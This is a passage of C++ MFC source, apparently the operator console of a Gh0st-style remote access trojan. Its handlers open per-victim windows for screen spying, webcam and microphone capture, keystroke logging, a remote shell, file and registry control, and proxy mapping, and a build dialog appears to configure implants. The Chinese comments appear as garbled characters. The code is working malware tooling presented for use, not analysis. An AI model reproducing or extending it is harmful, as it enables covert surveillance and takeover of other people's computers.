	ShowConnectionsNumber();
	
	return 0;
}

LRESULT CMainFrame::OnOpenScreenSpyDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext *pContext = (ClientContext *)lParam;
	
	CScreenSpyDlg	*dlg = new CScreenSpyDlg(this, m_iocpServer, pContext);
	// ���ø�����Ϊ׿��
	dlg->Create(IDD_DIALOG_SCREENSPY, GetDesktopWindow());
    dlg->ShowWindow(SW_SHOW);
	

	pContext->m_Dialog[0] = SCREENSPY_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CMainFrame::OnOpenChatDialog(WPARAM wParam, LPARAM lParam) // ���а�
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CMydat	*dlg = new CMydat(this, m_iocpServer, pContext);
	
	// ���ø�����Ϊ׿��
	dlg->Create(IDD_CHAT, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = GETDAT_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CMainFrame::OnOpenManagerDialog(WPARAM wParam, LPARAM lParam)
{	
	ClientContext *pContext = (ClientContext *)lParam;
	
	CFileManagerDlg	*dlg = new CFileManagerDlg(this, m_iocpServer, pContext);
	// ���ø�����Ϊ׿��
	dlg->Create(IDD_DIALOG_FILEMANAGER, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = FILEMANAGER_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	
	return 0;
}

LRESULT CMainFrame::OnOpenShellDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CShellDlg	*dlg = new CShellDlg(this, m_iocpServer, pContext);
	
	// ���ø�����Ϊ׿��
	dlg->Create(IDD_DIALOG_SHELL, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = SHELL_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CMainFrame::OnOpenWebCamDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext *pContext = (ClientContext *)lParam;
	CWebCamDlg	*dlg = new CWebCamDlg(this, m_iocpServer, pContext);
	// ���ø�����Ϊ׿��
	dlg->Create(IDD_DIALOG_WEBCAM, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	pContext->m_Dialog[0] = WEBCAM_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CMainFrame::OnOpenServiceDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext *pContext = (ClientContext *)lParam;
	CServiceDlg	*dlg = new CServiceDlg(this, m_iocpServer, pContext);
	// ���ø�����Ϊ׿��
	dlg->Create(IDD_DIALOG_SERVICE, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	pContext->m_Dialog[0] = SERVICE_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CMainFrame::OnOpenAudioDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext *pContext = (ClientContext *)lParam;
	CAudioDlg	*dlg = new CAudioDlg(this, m_iocpServer, pContext);
	// ���ø�����Ϊ׿��
	dlg->Create(IDD_DIALOG_AUDIO, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	pContext->m_Dialog[0] = AUDIO_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CMainFrame::OnOpenKeyBoardDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CKeyBoardDlg	*dlg = new CKeyBoardDlg(this, m_iocpServer, pContext);
	
	// ���ø�����Ϊ׿��
	dlg->Create(IDD_DIALOG_KEYBOARD, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = KEYBOARD_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CMainFrame::OnModifyList(WPARAM wParam, LPARAM lParam)
{	
	ClientContext	*pContext = (ClientContext *)lParam;
	if (pContext == NULL)
		return 0;
	
	CPcView* pView = NULL;
	pView = DYNAMIC_DOWNCAST(CPcView, CWnd::FromHandle(g_pTabView->m_wndTabControl.GetSelectedItem()->GetHandle()));
	
	int nCount = pView->m_pListCtrl->GetItemCount();
	
	for (int i=0; i < nCount; i++)
	{
		if (pContext == (ClientContext *)pView->m_pListCtrl->GetItemData(i))
		{
			CString str, strTemp;
			
			str = pView->m_pListCtrl->GetItemText(i,4);
			int n = str.Find("*");
			if (n == 0)
			{
				str = str.Right(str.GetLength() - 1);
			}
			strTemp = "*";
			strTemp += str;
			
			pView->m_pListCtrl->SetItemText(i,4,strTemp);
			
			break;
		}
	}
	
	return 0;
}




CXTPDockingPane* CMainFrame::CreatePane(int x, int y, CRuntimeClass* pNewViewClass, CString strFormat, XTPDockingPaneDirection direction, CXTPDockingPane* pNeighbour)
{
	//�������
	int nID = ++m_nCount;
	
	CXTPDockingPane* pwndPane = m_paneManager.CreatePane(nID, CRect(0, 0,x, y), direction, pNeighbour);
	
	CString strTitle;
	strTitle.Format(strFormat, nID);
	pwndPane->SetTitle(strTitle);
	pwndPane->SetIconID(nID % 6 + 1);
	
	CFrameWnd* pFrame = new CFrameWnd;
	
	CCreateContext context;
	context.m_pNewViewClass = pNewViewClass;
	context.m_pCurrentDoc = GetActiveView()->GetDocument();
	

	pFrame->Create(NULL, NULL, WS_CHILD|WS_VISIBLE|WS_CLIPCHILDREN|WS_CLIPSIBLINGS, CRect(0, 0, 0, 0), this, NULL, 0, &context);
	pFrame->ModifyStyleEx(WS_EX_CLIENTEDGE, 0);
	
	m_mapPanes.SetAt(nID, pFrame);
	
	return pwndPane;
}



LRESULT CMainFrame::OnOpenTextChatDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CTextChatDlg	*dlg = new CTextChatDlg(this, m_iocpServer, pContext);
/*
	CInputDialog Indlg;
	Indlg.Init("�����������ǳ�", _T("��ȡ��Ĭ���ǳ�ΪHacker:"), this);
	if (Indlg.DoModal() != IDOK)   
		dlg->strName = "Hacker:\r\n"; 
	else
		dlg->strName.Format("%s:\r\n",Indlg.m_str.GetBuffer(0)); */
 
	// ���ø�����Ϊ׿��
	dlg->Create(IDD_DIALOG_TEXTCHAT, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = CHAT_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CMainFrame::OnOpenSystemDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CSystemDlg	*dlg = new CSystemDlg(this, m_iocpServer, pContext);
	
	// ���ø�����Ϊ׿��
	dlg->Create(IDD_DIALOG_SYSTEM, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = SYSTEM_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CMainFrame::OnOpenRegeditDialog(WPARAM wParam, LPARAM lParam)    //ע���
{
    ClientContext	*pContext = (ClientContext *)lParam;
	CRegeditDlg	*dlg = new CRegeditDlg(this, m_iocpServer, pContext);
	//���ø�����Ϊ׿��
    dlg->Create(IDD_DIALOG_REGEDIT, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	pContext->m_Dialog[0] = REGEDIT_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	return 0;
}

LRESULT CMainFrame::OnOpenBuildDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	
	CBuildDlg dlg;
	
	dlg.bIsDllinfo = TRUE;
	dlg.m_pContext = pContext;
	dlg.m_iocpServer = m_iocpServer;
	
	LPBYTE lpBuffer = (LPBYTE)(pContext->m_DeCompressionBuffer.GetBuffer(1));
    memcpy(&dlg.m_dll_info, lpBuffer , sizeof(DLL_INFO));
	
	dlg.DoModal();
	
	return 0;
}

LRESULT CMainFrame::OnOpenProxyMapDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	CProxyMapDlg	*dlg = new CProxyMapDlg(this, m_iocpServer, pContext);
	
	// ���ø�����Ϊ׿��
	dlg->Create(IDD_DIALOG_PROXY_MAP, GetDesktopWindow());
	dlg->ShowWindow(SW_SHOW);
	
	pContext->m_Dialog[0] = PROXYMAP_DLG;
	pContext->m_Dialog[1] = (int)dlg;
	
	return 0;
}

void CMainFrame::OnTimer(UINT nIDEvent) 
{
	// TODO: Add your message handler code here and/or call default
	switch(nIDEvent)
	{
	case 0:
		{
			CString str;
			str.Format("����: %.2f kb/s ����: %.2f kb/s", (float)m_iocpServer->m_nSendKbps / 804, (float)m_iocpServer->m_nRecvKbps / 804);
			m_wndStatusBar.SetPaneText(1, str);
			m_iocpServer->m_nSendKbps = 0;
			m_iocpServer->m_nRecvKbps = 0;
		}
		break;
	default:
		break;
	}
	
	CXTPFrameWnd::OnTimer(nIDEvent);
}

LRESULT CMainFrame::OnOpenTempSysInfoDialog(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	pInfoMation->ShowSysinfoList(pContext);
	
	return 0;
}


LRESULT CMainFrame::OnDockingPaneNotify(WPARAM wParam, LPARAM lParam)
{
		  if (wParam == XTP_DPN_SHOWWINDOW)
		  {
			  // get a pointer to the docking pane being shown.
			  CXTPDockingPane* pPane = (CXTPDockingPane*)lParam;
			  if (!pPane->IsValid())
			  {
				  CWnd* pWnd = NULL;
				  if (m_mapPanes.Lookup(pPane->GetID(), pWnd))
				  {
					  pPane->Attach(pWnd);
				  }
			  }
			  
			  return TRUE; // handled
		  }
		  return FALSE;
}